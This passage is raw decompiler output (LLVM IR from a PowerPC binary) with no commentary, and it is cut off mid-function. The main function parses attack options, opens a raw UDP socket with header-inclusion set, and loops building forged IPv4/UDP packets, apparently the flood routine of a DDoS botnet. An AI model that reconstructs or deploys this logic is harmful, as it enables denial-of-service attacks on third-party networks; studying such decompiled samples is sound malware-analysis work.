  uselistorder i32 %v0_100059f4, { 1, 0 }
  uselistorder i32 %v0_100059e4, { 1, 0 }
  uselistorder i32 %v0_100059d4, { 1, 0 }
  uselistorder i1 %v1_100059a0, { 1, 0 }
  uselistorder i1 %v0_100059a0, { 1, 0 }
  uselistorder i32 %v1_10005990, { 0, 2, 3, 1 }
  uselistorder i32 %v4_10005954, { 1, 0 }
  uselistorder i32 %v2_10005934, { 1, 0 }
  uselistorder i32 %v1_100058f8, { 1, 0 }
  uselistorder i32 %v1_10005840, { 1, 0 }
  uselistorder i32 %v1_10005834, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 0 }
  uselistorder i32* %r30.global-to-local, { 0, 2, 5, 3, 1, 4, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 1 }
  uselistorder label %dec_label_pc_10005a08, { 1, 0 }
  uselistorder label %dec_label_pc_10005928, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100058d8, { 1, 0 }
  uselistorder label %dec_label_pc_100058d4, { 1, 0 }
  uselistorder label %dec_label_pc_100058d4.outer, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005880, { 1, 0 }
}

define i32 @function_10005a64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10005a64:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr3_lt.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-2184 = alloca i32, align 4
  %stack_var_-2180 = alloca i32, align 4
  %stack_var_-2148 = alloca i32, align 4
  %v0_10005a68 = load i32, i32* @lr, align 4
  store i32 %v0_10005a68, i32* %r0.global-to-local, align 4
  %v0_10005a6c = call i32 @__asm_mfcr()
  store i32 %v0_10005a6c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r14.global-to-local, align 4
  %v0_10005a7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10005a6c, i32* %r15.global-to-local, align 4
  %v0_10005a9c = load i32, i32* @r24, align 4
  %v0_10005aa0 = load i32, i32* @r25, align 4
  %v0_10005aa4 = load i32, i32* @r26, align 4
  %v0_10005aa8 = load i32, i32* @r27, align 4
  %v0_10005aac = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_10005abc = load i32, i32* @r31, align 4
  %v0_10005ad0 = load i32, i32* @r30, align 4
  store i32 268458712, i32* @lr, align 4
  %v2_10005ad4 = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_10005ad4, i32* %r16.global-to-local, align 4
  %v0_10005adc = load i32, i32* @r28, align 4
  %v0_10005ae8 = load i32, i32* @r29, align 4
  store i32 %v0_10005ae8, i32* %r3.global-to-local, align 4
  store i32 268458736, i32* @lr, align 4
  %v4_10005aec = inttoptr i32 %v0_10005adc to i32*
  %v5_10005aec = call i32 @function_1000235c(i32 %v0_10005ae8, i32* %v4_10005aec, i32 2, i32 0)
  %v5_10005afc = trunc i32 %v5_10005aec to i8
  %v0_10005b04 = load i32, i32* @r28, align 4
  %v0_10005b08 = load i32, i32* @r29, align 4
  store i32 %v0_10005b08, i32* %r3.global-to-local, align 4
  store i32 268458768, i32* @lr, align 4
  %v4_10005b0c = inttoptr i32 %v0_10005b04 to i32*
  %v5_10005b0c = call i32 @function_1000235c(i32 %v0_10005b08, i32* %v4_10005b0c, i32 3, i32 65535)
  %v0_10005b10 = load i32, i32* @r28, align 4
  store i32 %v5_10005b0c, i32* %r19.global-to-local, align 4
  %v0_10005b20 = load i32, i32* @r29, align 4
  store i32 %v0_10005b20, i32* %r3.global-to-local, align 4
  store i32 268458792, i32* @lr, align 4
  %v4_10005b24 = inttoptr i32 %v0_10005b10 to i32*
  %v5_10005b24 = call i32 @function_1000235c(i32 %v0_10005b20, i32* %v4_10005b24, i32 4, i32 64)
  %v0_10005b28 = load i32, i32* @r28, align 4
  %v5_10005b34 = trunc i32 %v5_10005b24 to i8
  %v0_10005b3c = load i32, i32* @r29, align 4
  store i32 %v0_10005b3c, i32* %r3.global-to-local, align 4
  store i32 268458820, i32* @lr, align 4
  %v4_10005b40 = inttoptr i32 %v0_10005b28 to i32*
  %v5_10005b40 = call i32 @function_1000235c(i32 %v0_10005b3c, i32* %v4_10005b40, i32 5, i32 0)
  %v0_10005b50 = load i32, i32* @r28, align 4
  %v1_10005b54 = urem i32 %v5_10005b40, 256
  store i32 %v1_10005b54, i32* %r27.global-to-local, align 4
  %v0_10005b58 = load i32, i32* @r29, align 4
  store i32 %v0_10005b58, i32* %r3.global-to-local, align 4
  store i32 268458848, i32* @lr, align 4
  %v4_10005b5c = inttoptr i32 %v0_10005b50 to i32*
  %v5_10005b5c = call i32 @function_1000235c(i32 %v0_10005b58, i32* %v4_10005b5c, i32 6, i32 65535)
  %v0_10005b60 = load i32, i32* @r28, align 4
  store i32 %v5_10005b5c, i32* %r20.global-to-local, align 4
  %v0_10005b70 = load i32, i32* @r29, align 4
  store i32 %v0_10005b70, i32* %r3.global-to-local, align 4
  store i32 268458872, i32* @lr, align 4
  %v4_10005b74 = inttoptr i32 %v0_10005b60 to i32*
  %v5_10005b74 = call i32 @function_1000235c(i32 %v0_10005b70, i32* %v4_10005b74, i32 7, i32 53)
  %v0_10005b7c = load i32, i32* @r28, align 4
  store i32 %v5_10005b74, i32* %r23.global-to-local, align 4
  %v0_10005b8c = load i32, i32* @r29, align 4
  store i32 %v0_10005b8c, i32* %r3.global-to-local, align 4
  store i32 268458900, i32* @lr, align 4
  %v4_10005b90 = inttoptr i32 %v0_10005b7c to i32*
  %v5_10005b90 = call i32 @function_1000235c(i32 %v0_10005b8c, i32* %v4_10005b90, i32 9, i32 65535)
  %v0_10005b94 = load i32, i32* @r28, align 4
  store i32 %v5_10005b90, i32* %r24.global-to-local, align 4
  %v0_10005ba4 = load i32, i32* @r29, align 4
  store i32 %v0_10005ba4, i32* %r3.global-to-local, align 4
  store i32 268458924, i32* @lr, align 4
  %v4_10005ba8 = inttoptr i32 %v0_10005b94 to i32*
  %v5_10005ba8 = call i32 @function_1000235c(i32 %v0_10005ba4, i32* %v4_10005ba8, i32 0, i32 12)
  %v0_10005bb4 = load i32, i32* @r28, align 4
  store i32 %v5_10005ba8, i32* %r26.global-to-local, align 4
  %v0_10005bbc = load i32, i32* @r29, align 4
  store i32 %v0_10005bbc, i32* %r3.global-to-local, align 4
  store i32 268458948, i32* @lr, align 4
  %v4_10005bc0 = inttoptr i32 %v0_10005bb4 to i32*
  %v5_10005bc0 = call i32 @function_10001d50(i32 %v0_10005bbc, i32* %v4_10005bc0, i32 8, i32 0)
  store i32 %v5_10005bc0, i32* %r25.global-to-local, align 4
  store i32 30, i32* %r3.global-to-local, align 4
  store i32 268458960, i32* @lr, align 4
  %v1_10005bcc = call i32 @function_1000a2ec(i32 30)
  store i32 30, i32* %r3.global-to-local, align 4
  %v3_10005bd8 = call i32 @function_1000a238(i32 30, i32* null)
  store i32 %v3_10005bd8, i32* %r3.global-to-local, align 4
  store i32 268458984, i32* @lr, align 4
  %v2_10005be4 = call i32 @function_1000b558(i32 %v3_10005bd8, i32 0)
  store i32 %v2_10005be4, i32* @r31, align 4
  store i32 30, i32* %r3.global-to-local, align 4
  store i32 268458996, i32* @lr, align 4
  %v1_10005bf0 = call i32 @function_1000a260(i32 30)
  store i32 %v1_10005bf0, i32* %r3.global-to-local, align 4
  %v0_10005bf4 = load i32, i32* @r31, align 4
  %v1_10005bf4 = icmp slt i32 %v0_10005bf4, 0
  %v3_10005bf4 = icmp eq i32 %v0_10005bf4, 0
  store i1 %v3_10005bf4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10005bf4, label %dec_label_pc_10005cc4, label %dec_label_pc_10005bfc

dec_label_pc_10005bfc:                            ; preds = %dec_label_pc_10005a64
  %v2_10005bfc = ptrtoint i32* %stack_var_-2148 to i32
  store i32 %v2_10005bfc, i32* %r28.global-to-local, align 4
  store i32 %v0_10005bf4, i32* %r3.global-to-local, align 4
  store i32 268459024, i32* @lr, align 4
  %v3_10005c0c = call i32 @function_1000b628(i32 %v0_10005bf4, i32 %v2_10005bfc, i32 2048)
  store i32 %v3_10005c0c, i32* %r30.global-to-local, align 4
  %v0_10005c14 = load i32, i32* @r31, align 4
  store i32 %v0_10005c14, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005c1c.81 to i32), i32* @lr, align 4
  %v0_10005c18 = call i32 @function_1000b3f0()
  store i32 31, i32* %r3.global-to-local, align 4
  store i32 268459044, i32* @lr, align 4
  %v1_10005c20 = call i32 @function_1000a2ec(i32 31)
  store i32 31, i32* %r3.global-to-local, align 4
  %v3_10005c2c = call i32 @function_1000a238(i32 31, i32* null)
  %v0_10005c30 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v2_10005bfc, i32* %r3.global-to-local, align 4
  %v3_10005c3c = bitcast i32* %stack_var_-2148 to i8*
  %v4_10005c3c = call i32 @function_1000af14(i8* %v3_10005c3c, i32 %v0_10005c30, i32 %v3_10005c2c)
  store i32 %v4_10005c3c, i32* @r31, align 4
  store i32 31, i32* %r3.global-to-local, align 4
  store i32 268459084, i32* @lr, align 4
  %v1_10005c48 = call i32 @function_1000a260(i32 31)
  store i32 %v1_10005c48, i32* %r3.global-to-local, align 4
  %v0_10005c4c = load i32, i32* @r31, align 4
  %v3_10005c4c = icmp eq i32 %v0_10005c4c, -1
  store i1 %v3_10005c4c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005c4c, label %dec_label_pc_10005cc4, label %dec_label_pc_10005c54

dec_label_pc_10005c54:                            ; preds = %dec_label_pc_10005bfc
  %v0_10005c54 = load i32, i32* %r30.global-to-local, align 4
  %v3_10005c54 = icmp sgt i32 %v0_10005c54, %v0_10005c4c
  %v4_10005c54 = icmp eq i32 %v0_10005c54, %v0_10005c4c
  store i1 %v4_10005c54, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005c54, label %dec_label_pc_10005c5c, label %dec_label_pc_10005cc4

dec_label_pc_10005c5c:                            ; preds = %dec_label_pc_10005c54
  %v2_10005c5c = sub i32 %v0_10005c54, %v0_10005c4c
  store i32 %v2_10005c5c, i32* %r0.global-to-local, align 4
  %v1_10005c60 = add i32 %v0_10005c54, -1
  store i32 %v1_10005c60, i32* %r3.global-to-local, align 4
  store i32 %v2_10005c5c, i32* %ctr.global-to-local, align 4
  %v0_10005c6c = load i32, i32* %r28.global-to-local, align 4
  %v2_10005c6c = add i32 %v0_10005c6c, %v0_10005c4c
  store i32 %v2_10005c6c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10005c74 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_10005c74, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005c78

dec_label_pc_10005c78:                            ; preds = %dec_label_pc_10005cbc, %dec_label_pc_10005c5c
  %v0_10005cc0 = phi i32 [ %v1_10005cc0, %dec_label_pc_10005cbc ], [ %v2_10005c5c, %dec_label_pc_10005c5c ]
  %v0_10005cbc = phi i32 [ %v1_10005cbc, %dec_label_pc_10005cbc ], [ %v0_10005c4c, %dec_label_pc_10005c5c ]
  %v0_10005c84 = phi i32 [ %v1_10005c84, %dec_label_pc_10005cbc ], [ %v2_10005c6c, %dec_label_pc_10005c5c ]
  %v0_10005c78 = phi i32 [ %v0_10005c784, %dec_label_pc_10005cbc ], [ 0, %dec_label_pc_10005c5c ]
  %v3_10005c78 = icmp eq i32 %v0_10005c78, 0
  store i1 %v3_10005c78, i1* %cr7_eq.global-to-local, align 1
  %v1_10005c7c = inttoptr i32 %v0_10005c84 to i8*
  %v2_10005c7c = load i8, i8* %v1_10005c7c, align 1
  %v3_10005c7c = zext i8 %v2_10005c7c to i32
  store i32 %v3_10005c7c, i32* %r9.global-to-local, align 4
  %v4_10005c80 = icmp eq i32 %v1_10005c60, %v0_10005cbc
  %v1_10005c84 = add i32 %v0_10005c84, 1
  store i32 %v1_10005c84, i32* %r11.global-to-local, align 4
  br i1 %v3_10005c78, label %dec_label_pc_10005c94, label %dec_label_pc_10005ca4

dec_label_pc_10005c94:                            ; preds = %dec_label_pc_10005c78
  %v3_10005c94 = icmp eq i8 %v2_10005c7c, 9
  store i1 %v3_10005c94, i1* %cr7_eq.global-to-local, align 1
  switch i8 %v2_10005c7c, label %dec_label_pc_10005ca0 [
    i8 32, label %dec_label_pc_10005cbc
    i8 9, label %dec_label_pc_10005cbc
  ]

dec_label_pc_10005ca0:                            ; preds = %dec_label_pc_10005c94
  store i32 1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10005ca4

dec_label_pc_10005ca4:                            ; preds = %dec_label_pc_10005c78, %dec_label_pc_10005ca0
  %v0_10005c785 = phi i32 [ %v0_10005c78, %dec_label_pc_10005c78 ], [ 1, %dec_label_pc_10005ca0 ]
  %v1_10005ca4 = add nuw nsw i32 %v3_10005c7c, 208
  %v1_10005ca8 = urem i32 %v1_10005ca4, 256
  store i32 %v1_10005ca8, i32* %r0.global-to-local, align 4
  %v2_10005cac = icmp ugt i32 %v1_10005ca8, 9
  %v3_10005cac = icmp eq i32 %v1_10005ca8, 9
  store i1 %v3_10005cac, i1* %cr7_eq.global-to-local, align 1
  %v3_10005c88.not = icmp ne i8 %v2_10005c7c, 46
  %brmerge.not = and i1 %v3_10005c88.not, %v2_10005cac
  %brmerge26 = or i1 %v4_10005c80, %brmerge.not
  br i1 %brmerge26, label %dec_label_pc_10005cf8, label %dec_label_pc_10005cbc

dec_label_pc_10005cbc:                            ; preds = %dec_label_pc_10005ca4, %dec_label_pc_10005c94, %dec_label_pc_10005c94
  %v0_10005c784 = phi i32 [ 0, %dec_label_pc_10005c94 ], [ 0, %dec_label_pc_10005c94 ], [ %v0_10005c785, %dec_label_pc_10005ca4 ]
  %v1_10005cbc = add i32 %v0_10005cbc, 1
  %v1_10005cc0 = add i32 %v0_10005cc0, -1
  store i32 %v1_10005cc0, i32* %ctr.global-to-local, align 4
  %v2_10005cc0 = icmp eq i32 %v1_10005cc0, 0
  br i1 %v2_10005cc0, label %dec_label_pc_10005cc4, label %dec_label_pc_10005c78

dec_label_pc_10005cc4:                            ; preds = %dec_label_pc_10005cbc, %dec_label_pc_10005c54, %dec_label_pc_10005bfc, %dec_label_pc_10005a64
  %v0_10005cc4 = call i32 @function_10007ca8()
  %v1_10005cc8 = urem i32 %v0_10005cc4, 4
  store i32 %v1_10005cc8, i32* %r3.global-to-local, align 4
  %v3_10005ccc = icmp eq i32 %v1_10005cc8, 1
  store i1 %v3_10005ccc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005ccc, label %dec_label_pc_100060b0, label %dec_label_pc_10005cd4

dec_label_pc_10005cd4:                            ; preds = %dec_label_pc_10005cc4
  %v1_10005ccc = icmp eq i32 %v1_10005cc8, 0
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10005ccc, label %dec_label_pc_100060c8, label %dec_label_pc_10005cdc

dec_label_pc_10005cdc:                            ; preds = %dec_label_pc_10005cd4
  %v2_10005cdc = icmp eq i32 %v1_10005cc8, 3
  %v3_10005cdc = icmp eq i32 %v1_10005cc8, 2
  store i1 %v3_10005cdc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005cdc, label %dec_label_pc_100060bc, label %dec_label_pc_10005ce4

dec_label_pc_10005ce4:                            ; preds = %dec_label_pc_10005cdc
  store i1 %v2_10005cdc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10005cdc, label %dec_label_pc_10005cec, label %dec_label_pc_10005d28

dec_label_pc_10005cec:                            ; preds = %dec_label_pc_10005ce4
  store i32 67240450, i32* @r21, align 4
  br label %dec_label_pc_10005d28

dec_label_pc_10005cf8:                            ; preds = %dec_label_pc_10005ca4
  %v2_10005cf8 = sub i32 %v0_10005cbc, %v0_10005c4c
  store i32 %v2_10005c74, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005d0c.82 to i32), i32* @lr, align 4
  %v3_10005d08 = call i32 @function_1000abe8(i32 %v2_10005c74, i32 %v2_10005c6c, i32 %v2_10005cf8)
  %v2_10005d0c = ptrtoint i32* %stack_var_-2184 to i32
  %v2_10005d10 = add i32 %v2_10005cf8, %v2_10005d0c
  store i32 %v2_10005d10, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10005d18 = add i32 %v2_10005d10, 4
  %v4_10005d18 = inttoptr i32 %v3_10005d18 to i8*
  store i8 0, i8* %v4_10005d18, align 1
  store i32 %v2_10005c74, i32* %r3.global-to-local, align 4
  store i32 268459300, i32* @lr, align 4
  %v1_10005d20 = call i32 @function_1000bf20(i32 %v2_10005c74)
  store i32 %v1_10005d20, i32* %r3.global-to-local, align 4
  store i32 %v1_10005d20, i32* @r21, align 4
  br label %dec_label_pc_10005d28

dec_label_pc_10005d28:                            ; preds = %dec_label_pc_10005ce4, %dec_label_pc_100060c8, %dec_label_pc_100060bc, %dec_label_pc_100060b0, %dec_label_pc_10005cec, %dec_label_pc_10005cf8
  %v0_10005d28 = load i32, i32* %r25.global-to-local, align 4
  %v3_10005d28 = icmp eq i32 %v0_10005d28, 0
  store i1 %v3_10005d28, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005d28, label %dec_label_pc_10006050, label %dec_label_pc_10005d30

dec_label_pc_10005d30:                            ; preds = %dec_label_pc_10005d28
  store i32 %v0_10005d28, i32* %r3.global-to-local, align 4
  store i32 268459320, i32* @lr, align 4
  %v1_10005d34 = inttoptr i32 %v0_10005d28 to i8*
  %v2_10005d34 = call i32 @function_1000ab64(i8* %v1_10005d34)
  store i32 %v2_10005d34, i32* @r29, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268459340, i32* @lr, align 4
  %v3_10005d48 = call i32 @function_1000c1bc(i32 2, i32 3, i32 17)
  store i32 %v3_10005d48, i32* %r3.global-to-local, align 4
  %v3_10005d4c = icmp eq i32 %v3_10005d48, -1
  store i1 %v3_10005d4c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10005d48, i32* %r22.global-to-local, align 4
  br i1 %v3_10005d4c, label %dec_label_pc_10006050, label %dec_label_pc_10005d58

dec_label_pc_10005d58:                            ; preds = %dec_label_pc_10005d30
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10005d64 = ptrtoint i32* %stack_var_-2184 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-2184, align 4
  store i32 268459380, i32* @lr, align 4
  %v5_10005d70 = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_10005d64, i32 4, i32 4)
  store i32 %v5_10005d70, i32* %r3.global-to-local, align 4
  %v3_10005d74 = icmp eq i32 %v5_10005d70, -1
  store i1 %v3_10005d74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005d74, label %dec_label_pc_10006048, label %dec_label_pc_10005d7c

dec_label_pc_10005d7c:                            ; preds = %dec_label_pc_10005d58
  %v0_10005d7c = load i32, i32* %r15.global-to-local, align 4
  %v1_10005d7c = icmp slt i32 %v0_10005d7c, 0
  %v3_10005d7c = icmp eq i32 %v0_10005d7c, 0
  store i1 %v1_10005d7c, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10005d7c, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10005d84 = load i32, i32* %r19.global-to-local, align 4
  %v1_10005d84 = urem i32 %v0_10005d84, 65536
  store i32 %v1_10005d84, i32* %r17.global-to-local, align 4
  %v0_10005d88 = load i32, i32* %r20.global-to-local, align 4
  %v1_10005d88 = urem i32 %v0_10005d88, 65536
  store i32 %v1_10005d88, i32* %r18.global-to-local, align 4
  %v0_10005d8c = load i32, i32* %r23.global-to-local, align 4
  %v1_10005d8c = urem i32 %v0_10005d8c, 65536
  store i32 %v1_10005d8c, i32* %r19.global-to-local, align 4
  store i32 0, i32* %stack_var_-2184, align 4
  %v0_10005d94 = load i32, i32* %r24.global-to-local, align 4
  %v1_10005d94 = urem i32 %v0_10005d94, 65536
  store i32 %v1_10005d94, i32* %r20.global-to-local, align 4
  %v0_10005d98 = load i32, i32* %r26.global-to-local, align 4
  %v1_10005d98 = urem i32 %v0_10005d98, 256
  store i32 %v1_10005d98, i32* %r23.global-to-local, align 4
  %tmp53 = icmp slt i32 %v0_10005d7c, 1
  %v1_1000603c = load i32, i32* @r29, align 4
  %v2_1000603c = add i32 %v1_1000603c, %v1_10005d98
  store i32 %v2_1000603c, i32* @r24, align 4
  br i1 %tmp53, label %dec_label_pc_10005f00.preheader, label %dec_label_pc_10005da0

dec_label_pc_10005da0:                            ; preds = %dec_label_pc_10005d7c
  %v1_10005da4 = icmp slt i32 %v1_1000603c, 0
  %v3_10005da4 = icmp eq i32 %v1_1000603c, 0
  store i1 %v1_10005da4, i1* %cr3_lt.global-to-local, align 1
  store i1 %v3_10005da4, i1* %cr3_eq.global-to-local, align 1
  %v1_10005da8 = urem i32 %v2_1000603c, 65536
  %v0_10005dac = load i32, i32* %r27.global-to-local, align 4
  %v3_10005dac = icmp eq i32 %v0_10005dac, 0
  store i1 %v3_10005dac, i1* %cr2_eq.global-to-local, align 1
  %v1_10005db0 = add nuw nsw i32 %v1_10005da8, 27
  store i32 %v1_10005db0, i32* %r0.global-to-local, align 4
  %v1_10005db4 = add nuw nsw i32 %v1_10005da8, 47
  store i32 %v1_10005db4, i32* %r9.global-to-local, align 4
  %fold = add i32 %v2_1000603c, 47
  %v1_10005db8 = urem i32 %fold, 65536
  store i32 %v1_10005db8, i32* %r26.global-to-local, align 4
  %fold3 = add i32 %v2_1000603c, 27
  %v1_10005dbc = urem i32 %fold3, 65536
  store i32 %v1_10005dbc, i32* %r27.global-to-local, align 4
  %v1_10005dc0 = add i32 %v1_1000603c, 1
  store i32 %v1_10005dc0, i32* @r28, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v4_10005e10 = sext i8 %v5_10005afc to i32
  %v4_10005e18 = sext i8 %v5_10005b34 to i32
  br label %dec_label_pc_10005dc8

dec_label_pc_10005dc8:                            ; preds = %dec_label_pc_10005ed8, %dec_label_pc_10005da0
  store i32 600, i32* %r3.global-to-local, align 4
  store i32 268459476, i32* @lr, align 4
  %v2_10005dd0 = call i32 @function_1000c548(i32 600, i32 1)
  store i32 %v2_10005dd0, i32* %r3.global-to-local, align 4
  %v3_10005dd4 = load i32, i32* %stack_var_-2184, align 4
  store i32 %v3_10005dd4, i32* %r0.global-to-local, align 4
  %v0_10005dd8 = load i32, i32* @r31, align 4
  %v1_10005dd8 = mul i32 %v0_10005dd8, 4
  store i32 %v1_10005dd8, i32* %r9.global-to-local, align 4
  %v2_10005ddc = load i32, i32* %r16.global-to-local, align 4
  %v3_10005ddc = add i32 %v2_10005ddc, %v1_10005dd8
  %v4_10005ddc = inttoptr i32 %v3_10005ddc to i32*
  store i32 %v2_10005dd0, i32* %v4_10005ddc, align 4
  %v0_10005de0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005de0 = mul i32 %v0_10005de0, 4
  store i32 %v1_10005de0, i32* %r0.global-to-local, align 4
  %v0_10005de4 = load i32, i32* %r16.global-to-local, align 4
  %v2_10005de4 = add i32 %v0_10005de4, %v1_10005de0
  %v3_10005de4 = inttoptr i32 %v2_10005de4 to i32*
  %v4_10005de4 = load i32, i32* %v3_10005de4, align 4
  store i32 %v4_10005de4, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10005dec = inttoptr i32 %v4_10005de4 to i32*
  %v2_10005dec = load i32, i32* %v1_10005dec, align 4
  store i32 %v2_10005dec, i32* %r9.global-to-local, align 4
  %v1_10005df0 = add i32 %v4_10005de4, 20
  store i32 %v1_10005df0, i32* %r10.global-to-local, align 4
  %v0_10005df4 = load i32, i32* %r17.global-to-local, align 4
  %v1_10005df4 = trunc i32 %v0_10005df4 to i16
  %v3_10005df4 = add i32 %v4_10005de4, 4
  %v4_10005df4 = inttoptr i32 %v3_10005df4 to i16*
  store i16 %v1_10005df4, i16* %v4_10005df4, align 2
  %v0_10005df8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005df8 = add i32 %v0_10005df8, 28
  store i32 %v1_10005df8, i32* %r8.global-to-local, align 4
  %v1_10005dfc = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10005dfc, i32* %r9.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10005e04 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10005e04, i32* %r9.global-to-local, align 4
  %v1_10005e08 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005e08 = inttoptr i32 %v1_10005e08 to i32*
  store i32 %v1_10005e04, i32* %v2_10005e08, align 4
  %v0_10005e0c = load i32, i32* %r26.global-to-local, align 4
  %v1_10005e0c = trunc i32 %v0_10005e0c to i16
  %v2_10005e0c = load i32, i32* %r11.global-to-local, align 4
  %v3_10005e0c = add i32 %v2_10005e0c, 2
  %v4_10005e0c = inttoptr i32 %v3_10005e0c to i16*
  store i16 %v1_10005e0c, i16* %v4_10005e0c, align 2
  store i32 %v4_10005e10, i32* %r0.global-to-local, align 4
  %v2_10005e14 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005e14 = add i32 %v2_10005e14, 1
  %v4_10005e14 = inttoptr i32 %v3_10005e14 to i8*
  store i8 %v5_10005afc, i8* %v4_10005e14, align 1
  store i32 %v4_10005e18, i32* %r7.global-to-local, align 4
  %v2_10005e1c = load i32, i32* %r11.global-to-local, align 4
  %v3_10005e1c = add i32 %v2_10005e1c, 8
  %v4_10005e1c = inttoptr i32 %v3_10005e1c to i8*
  store i8 %v5_10005b34, i8* %v4_10005e1c, align 1
  %v0_10005e20 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10005e20, label %dec_label_pc_10005e2c, label %dec_label_pc_10005e24

dec_label_pc_10005e24:                            ; preds = %dec_label_pc_10005dc8
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10005e28 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005e28 = add i32 %v2_10005e28, 6
  %v4_10005e28 = inttoptr i32 %v3_10005e28 to i16*
  store i16 16384, i16* %v4_10005e28, align 2
  br label %dec_label_pc_10005e2c

dec_label_pc_10005e2c:                            ; preds = %dec_label_pc_10005dc8, %dec_label_pc_10005e24
  store i32 268566528, i32* %r7.global-to-local, align 4
  %v2_10005e34 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005e34 = add i32 %v2_10005e34, 9
  %v4_10005e34 = inttoptr i32 %v3_10005e34 to i8*
  store i8 17, i8* %v4_10005e34, align 1
  %v0_10005e38 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005e38 = add i32 %v0_10005e38, 41
  store i32 %v1_10005e38, i32* %r9.global-to-local, align 4
  %v0_10005e3c = load i32, i32* %r27.global-to-local, align 4
  %v1_10005e3c = trunc i32 %v0_10005e3c to i16
  %v2_10005e3c = load i32, i32* %r10.global-to-local, align 4
  %v3_10005e3c = add i32 %v2_10005e3c, 4
  %v4_10005e3c = inttoptr i32 %v3_10005e3c to i16*
  store i16 %v1_10005e3c, i16* %v4_10005e3c, align 2
  %v0_10005e40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e40 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005e40 = add i32 %v1_10005e40, %v0_10005e40
  store i32 %v2_10005e40, i32* %r30.global-to-local, align 4
  %v3_10005e44 = load i32, i32* @global_var_1001eb10.71, align 4
  store i32 %v3_10005e44, i32* %r0.global-to-local, align 4
  %v1_10005e48 = add i32 %v2_10005e40, 1
  store i32 %v1_10005e48, i32* %r31.global-to-local, align 4
  %v0_10005e4c = load i32, i32* %r19.global-to-local, align 4
  %v1_10005e4c = trunc i32 %v0_10005e4c to i16
  %v2_10005e4c = load i32, i32* %r10.global-to-local, align 4
